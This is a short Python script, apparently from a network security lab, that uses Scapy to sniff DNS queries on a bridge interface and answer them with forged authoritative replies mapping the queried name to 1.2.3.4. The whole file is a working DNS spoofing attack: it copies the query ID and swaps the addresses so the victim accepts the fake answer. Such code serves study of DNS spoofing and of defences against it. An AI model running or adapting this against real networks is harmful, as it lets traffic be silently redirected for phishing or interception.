# Import scapy libraries
from scapy.all import *

net_interface = next((iface for iface in conf.ifaces.values() if iface.name.startswith("br-")), None)

# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"        # DNS queries only
    #"src host 192.168.86.25"     IP source <ip>
    ])

# Function that replies to DNS query
def dns_reply(packet):

    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    # Construct the DNS response by looking at the sniffed packet and manually
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        an=DNSRR(
             rrname=packet[DNS].qd.qname,
             type='A',
             ttl=600,
            rdata='1.2.3.4'),
        ar=packet[DNSRROPT])

    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    print(response_packet.show())
    sendp(response_packet, iface=net_interface)

# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
sniff(filter=packet_filter, prn=dns_reply, store=0, iface=net_interface, count=1)